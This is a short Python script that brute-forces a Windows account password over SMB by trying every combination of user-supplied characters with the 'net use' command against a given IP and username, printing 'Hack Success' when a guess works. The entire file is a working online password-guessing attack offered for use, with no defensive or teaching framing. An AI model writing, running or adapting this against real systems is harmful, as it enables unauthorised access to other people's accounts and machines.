import itertools
import time
import subprocess

lengthA = int(input("What is the length of the password? : "))
Characters = input("What is the characters used for the password? : ")
ip = input("The ip of your computer : ")
user = input("What is your user : ")



def brute_force(chars, length):
    start_time = time.time()
    attempts = 0
    for attempt in itertools.product(chars, repeat=length):
        guess = ''.join(attempt)
        print(f"Trying: {guess}")
        attempts += 1
        result = subprocess.run(
            ["net", "use", f"\\\\{ip}", f"/user:{user}", guess],
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            print(f"Password found: {guess}")
            bb = input("Hack Success ... ")
            print(bb)
            break

def main():
    print("Starting brute-force...")
    start_time = time.time()
    brute_force(Characters, lengthA)
    

if __name__ == "__main__":
    main()
